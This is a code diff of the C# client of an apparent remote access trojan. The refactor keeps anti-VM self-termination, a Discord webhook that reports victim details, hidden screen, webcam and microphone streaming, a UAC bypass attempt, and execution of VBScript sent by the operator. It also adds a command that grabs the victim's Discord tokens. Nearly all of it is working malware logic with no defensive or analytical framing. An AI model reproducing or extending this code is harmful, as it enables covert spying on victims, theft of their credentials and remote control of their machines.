@@ -1,17 +1,17 @@
-﻿using LazyServer;
+﻿using AForge.Video;
+using AForge.Video.DirectShow;
+using LazyServer;
+using NAudio.Wave;
 using Newtonsoft.Json.Linq;
-using PentestTools;
 using System;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
+using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using AForge.Video;
-using AForge.Video.DirectShow;
-using NAudio.Wave;
-using System.Diagnostics;
 
 namespace Client
 {
@@ -20,7 +20,7 @@ namespace Client
         public static JObject config = GClass.config();
         public static int monitoridx = 0;
         public static int cameraidx = 0;
-        public static int micidx = 0; // ✅ Added micidx
+        public static int micidx = 0;
 
         private static CancellationTokenSource screenshotTokenSource;
         private static Task screenshotLoopTask;
@@ -47,83 +47,23 @@ namespace Client
             Application.Run(new InvisibleForm());
         }
 
-        private static async Task SendToDiscordWebhookAsync(string webhookUrl, JObject clientInfo)
-        {
-            try
-            {
-                var embed = new JObject
-                {
-                    ["title"] = "🟢 New Client Connected",
-                    ["color"] = 65280, // green
-                    ["fields"] = new JArray
-            {
-                new JObject { ["name"] = "IP", ["value"] = $"`{clientInfo["ip"]}`", ["inline"] = true },
-                new JObject { ["name"] = "Username", ["value"] = $"`{clientInfo["username"]}`", ["inline"] = true },
-                new JObject { ["name"] = "OS", ["value"] = $"`{clientInfo["os"]}`", ["inline"] = false },
-                new JObject { ["name"] = "CPU", ["value"] = $"`{clientInfo["cpu"]}`", ["inline"] = false },
-                new JObject { ["name"] = "GPU", ["value"] = $"`{clientInfo["gpu"]}`", ["inline"] = false },
-                new JObject { ["name"] = "UAC Status", ["value"] = $"`{clientInfo["uac"]}`", ["inline"] = true },
-                new JObject { ["name"] = "HWID", ["value"] = $"`{clientInfo["hwid"]}`", ["inline"] = false }
-            },
-                    ["footer"] = new JObject
-                    {
-                        ["text"] = "Client connected at " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
-                    }
-                };
-
-                var payload = new JObject
-                {
-                    ["embeds"] = new JArray { embed }
-                };
-
-                using (var httpClient = new System.Net.Http.HttpClient())
-                {
-                    var content = new System.Net.Http.StringContent(payload.ToString(), System.Text.Encoding.UTF8, "application/json");
-                    await httpClient.PostAsync(webhookUrl, content);
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Failed to send to Discord webhook: " + ex.Message);
-            }
-        }
-
-
-
         static async Task RunClientAsync()
         {
-            if (GClass.IsTrue("antivm"))
-            {
-                var res = VirtualizationDetection.VMDetector.Detect();
-                Console.WriteLine(res.ToString());
-                if (res != VirtualizationDetection.VmType.None)
-                {
-                    // killing myself!!!!!!!!!!!!!!!!
-                    Process.GetCurrentProcess().Kill();
-                }
-                ;
-                Console.WriteLine("we're continuing");
+            if (GClass.IsTrue("binfile")) { // for the builder
+                Process.GetCurrentProcess().Kill();
             }
 
-            var info = new JObject
+            if (GClass.IsTrue("antivm") && VirtualizationDetection.VMDetector.Detect() != VirtualizationDetection.VmType.None)
             {
-                ["msg"] = "alive",
-                ["ip"] = await GClass.GetIp(),
-                ["username"] = DeviceInfo.GetUsername(),
-                ["os"] = DeviceInfo.GetOSInfo(),
-                ["cpu"] = DeviceInfo.GetCPUInfo(),
-                ["gpu"] = DeviceInfo.GetGPUInfo(),
-                ["uac"] = DeviceInfo.GetUACStatus(),
-                ["hwid"] = DeviceInfo.GetHWID(),
-            };
+                Process.GetCurrentProcess().Kill();
+            }
+
+            JObject clientInfo = await GClass.BuildClientInfo();
 
             if (GClass.IsTrue("discord") && config["webhook"] != null)
             {
                 string webhookUrl = (string)config["webhook"];
-                Task.Run(async () =>
-                {
-                    await SendToDiscordWebhookAsync(webhookUrl, info);
-                });
+                _ = GClass.SendWebhookNotificationAsync(webhookUrl, clientInfo);
             }
 
             var client = new LazyServerClient();
@@ -137,13 +77,10 @@ namespace Client
                 }
             };
 
-            var ss = ScreenCapture.CaptureScreenWithCursor();
+            var screenshot = GClass.CaptureScreen(Screen.AllScreens[monitoridx]);
+            await client.SendFileBytesWithMeta(screenshot, clientInfo.ToString());
 
-            
-
-            await client.SendFileBytesWithMeta(ss, info.ToString());
-            // Check if Discord notification is enabled
-            
+            GClass.StartHeartbeat(client);
 
             client.MessageReceived += async (s, e) =>
             {
@@ -156,50 +93,32 @@ namespace Client
                     {
                         case "ssloop":
                             if (!screenshotLoopRunning)
-                            {
                                 await StartScreenshotLoopAsync(client, message);
-                                screenshotLoopRunning = true;
-                            }
                             break;
 
                         case "stopss":
                             if (screenshotLoopRunning)
-                            {
                                 await StopScreenshotLoopAsync();
-                                screenshotLoopRunning = false;
-                            }
                             break;
 
                         case "camloop":
                             if (!camLoopRunning)
-                            {
                                 await StartCamLoopAsync(client, message);
-                                camLoopRunning = true;
-                            }
                             break;
 
                         case "stopcam":
                             if (camLoopRunning)
-                            {
                                 await StopCamLoopAsync();
-                                camLoopRunning = false;
-                            }
                             break;
 
                         case "micloop":
                             if (!micLoopRunning)
-                            {
                                 await StartMicLoopAsync(client);
-                                micLoopRunning = true;
-                            }
                             break;
 
                         case "stopmic":
                             if (micLoopRunning)
-                            {
                                 await StopMicLoopAsync();
-                                micLoopRunning = false;
-                            }
                             break;
 
                         case "mon":
@@ -210,7 +129,7 @@ namespace Client
                             cameraidx = (int)message["idx"];
                             break;
 
-                        case "mic": // ✅ New case for mic index
+                        case "mic":
                             micidx = (int)message["idx"];
                             break;
 
@@ -218,88 +137,43 @@ namespace Client
                             isGracefulDisconnect = true;
                             client.Disconnect();
 
-                            if (!UacBypassHelper.TryBypassUAC())
-                            {
-                                await Task.Delay(3000);
-                                Console.WriteLine("UAC Bypass failed.");
+                            if (!await GClass.TryBypassAndReconnect(client, screenshot))
                                 isGracefulDisconnect = false;
-                                await GClass.ReconnectLoop(client);
-                                await client.SendFileBytesWithMeta(ss, new JObject
-                                {
-                                    ["msg"] = "alive",
-                                    ["ip"] = await GClass.GetIp(),
-                                    ["username"] = DeviceInfo.GetUsername(),
-                                    ["os"] = DeviceInfo.GetOSInfo(),
-                                    ["cpu"] = DeviceInfo.GetCPUInfo(),
-                                    ["gpu"] = DeviceInfo.GetGPUInfo(),
-                                    ["uac"] = DeviceInfo.GetUACStatus(),
-                                    ["hwid"] = DeviceInfo.GetHWID(),
-                                }.ToString());
-                                await client.SendFileBytesWithMeta(ss, new JObject
-                                {
-                                    ["msg"] = "log",
-                                    ["message"] = "Failed to UAC Bypass",
-                                    ["type"] = "Error"
-                                }.ToString());
-                            }
+
                             break;
+
                         case "vbexec":
                             string tempPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".vbs");
-
                             try
                             {
                                 File.WriteAllText(tempPath, (string)message["body"]);
-
-                                ProcessStartInfo startInfo = new ProcessStartInfo()
+                                ProcessStartInfo psi = new()
                                 {
                                     FileName = "wscript.exe",
                                     Arguments = $"\"{tempPath}\"",
                                     UseShellExecute = false,
                                     CreateNoWindow = true
                                 };
-
-                                using (Process process = Process.Start(startInfo))
-                                {
-                                    process.WaitForExit();
-                                }
+                                using var p = Process.Start(psi);
+                                p?.WaitForExit();
                             }
                             finally
                             {
-                                if (File.Exists(tempPath))
-                                {
-                                    try { File.Delete(tempPath); } catch { /* ignore if locked */ }
-                                }
+                                try { File.Delete(tempPath); } catch { }
                             }
+                            break;
+
+                        case "grabtoken":
+                            await client.SendMessage(new JObject
+                            {
+                                ["msg"] = "token",
+                                ["body"] = GClass.GetDiscordTokens()
+                            }.ToString());
                             break;
                     }
                 }
-                catch
-                {
-                    // Optional: handle errors
-                }
+                catch { /* silently ignore */ }
             };
-            // Start heartbeat loop to keep connection alive
-            _ = Task.Run(async () =>
-            {
-                while (true)
-                {
-                    try
-                    {
-                        if (client != null && client.IsConnected)
-                        {
-                            var payload = System.Text.Encoding.UTF8.GetBytes("ping");
-                            await client.SendHeartbeat(payload);
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        Console.WriteLine($"Heartbeat error: {ex.Message}");
-                    }
-
-                    await Task.Delay(30000); // every 30 seconds
-                }
-            });
-
         }
 
         static async Task StartScreenshotLoopAsync(LazyServerClient client, JObject message)
@@ -310,13 +184,11 @@ namespace Client
             var token = screenshotTokenSource.Token;
 
             int quality = 100;
-            if (message["quality"] != null)
+            if (message["quality"] != null &&
+                message["quality"].ToString().EndsWith("%") &&
+                int.TryParse(message["quality"].ToString().TrimEnd('%'), out int qVal))
             {
-                string qualityStr = (string)message["quality"];
-                if (qualityStr.EndsWith("%") && int.TryParse(qualityStr.TrimEnd('%'), out int qVal))
-                {
-                    quality = Math.Max(10, Math.Min(qVal, 100));
-                }
+                quality = Math.Max(10, Math.Min(qVal, 100));
             }
 
             screenshotLoopTask = Task.Run(async () =>
@@ -325,8 +197,8 @@ namespace Client
                 {
                     try
                     {
-                        var screenshot = DeviceInfo.Capture(Screen.AllScreens[monitoridx], quality);
-                        await client.SendFileBytesWithMeta(screenshot, new JObject
+                        var shot = GClass.CaptureScreen(Screen.AllScreens[monitoridx], quality);
+                        await client.SendFileBytesWithMeta(shot, new JObject
                         {
                             ["msg"] = "screenshot",
                             ["monitors"] = Screen.AllScreens.Length
@@ -338,10 +210,7 @@ namespace Client
                     {
                         await Task.Delay(70, token);
                     }
-                    catch (OperationCanceledException)
-                    {
-                        break;
-                    }
+                    catch (OperationCanceledException) { break; }
                 }
             }, token);
 
@@ -359,10 +228,7 @@ namespace Client
 
             if (screenshotLoopTask != null)
             {
-                try
-                {
-                    await screenshotLoopTask;
-                }
+                try { await screenshotLoopTask; }
                 catch (OperationCanceledException) { }
                 catch { }
             }
@@ -381,20 +247,17 @@ namespace Client
             var token = camTokenSource.Token;
 
             int quality = 90;
-            if (message["quality"] != null)
+            if (message["quality"] != null &&
+                message["quality"].ToString().EndsWith("%") &&
+                int.TryParse(message["quality"].ToString().TrimEnd('%'), out int qVal))
             {
-                string qualityStr = (string)message["quality"];
-                if (qualityStr.EndsWith("%") && int.TryParse(qualityStr.TrimEnd('%'), out int qVal))
-                {
-                    quality = Math.Max(10, Math.Min(qVal, 100));
-                }
+                quality = Math.Max(10, Math.Min(qVal, 100));
             }
 
             camLoopTask = Task.Run(async () =>
             {
                 var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
-                if (devices.Count == 0 || cameraidx >= devices.Count)
-                    return;
+                if (devices.Count == 0 || cameraidx >= devices.Count) return;
 
                 var videoSource = new VideoCaptureDevice(devices[cameraidx].MonikerString);
                 Bitmap currentFrame = null;
@@ -418,19 +281,17 @@ namespace Client
 
                         if (currentFrame != null)
                         {
-                            using (var ms = new MemoryStream())
-                            {
-                                var encoderParams = new EncoderParameters(1);
-                                encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, quality);
-                                var jpegCodec = GetEncoder(ImageFormat.Jpeg);
-                                currentFrame.Save(ms, jpegCodec, encoderParams);
+                            using var ms = new MemoryStream();
+                            var encoderParams = new EncoderParameters(1);
+                            encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, quality);
+                            var jpegCodec = GClass.GetEncoder(ImageFormat.Jpeg);
+                            currentFrame.Save(ms, jpegCodec, encoderParams);
 
-                                await client.SendFileBytesWithMeta(ms.ToArray(), new JObject
-                                {
-                                    ["msg"] = "camframe",
-                                    ["cameras"] = devices.Count
-                                }.ToString());
-                            }
+                            await client.SendFileBytesWithMeta(ms.ToArray(), new JObject
+                            {
+                                ["msg"] = "camframe",
+                                ["cameras"] = devices.Count
+                            }.ToString());
                         }
 
                         await Task.Delay(100, token);
@@ -456,19 +317,12 @@ namespace Client
             if (camTokenSource != null)
             {
                 camTokenSource.Cancel();
-
-                try
-                {
-                    await camLoopTask;
-                }
-                catch (OperationCanceledException) { }
-                catch { }
-
+                try { await camLoopTask; } catch (OperationCanceledException) { } catch { }
                 camTokenSource.Dispose();
-                camTokenSource = null;
-                camLoopTask = null;
             }
 
+            camTokenSource = null;
+            camLoopTask = null;
             camLoopRunning = false;
         }
 
@@ -480,9 +334,7 @@ namespace Client
             var token = micTokenSource.Token;
 
             int deviceCount = WaveIn.DeviceCount;
-
-            if (deviceCount == 0 || micidx >= deviceCount)
-                return;
+            if (deviceCount == 0 || micidx >= deviceCount) return;
 
             waveIn = new WaveInEvent
             {
@@ -501,7 +353,7 @@ namespace Client
                 _ = client.SendFileBytesWithMeta(pcm, new JObject
                 {
                     ["msg"] = "micaudio",
-                    ["microphones"] = deviceCount // ✅ Send mic count
+                    ["microphones"] = deviceCount
                 }.ToString());
             };
 
@@ -529,31 +381,13 @@ namespace Client
             if (micTokenSource != null)
             {
                 micTokenSource.Cancel();
-
-                try
-                {
-                    await micLoopTask;
-                }
-                catch (OperationCanceledException) { }
-                catch { }
-
+                try { await micLoopTask; } catch (OperationCanceledException) { } catch { }
                 micTokenSource.Dispose();
-                micTokenSource = null;
-                micLoopTask = null;
             }
 
+            micTokenSource = null;
+            micLoopTask = null;
             micLoopRunning = false;
-        }
-
-        private static ImageCodecInfo GetEncoder(ImageFormat format)
-        {
-            var codecs = ImageCodecInfo.GetImageDecoders();
-            foreach (var codec in codecs)
-            {
-                if (codec.FormatID == format.Guid)
-                    return codec;
-            }
-            return null;
         }
     }
 
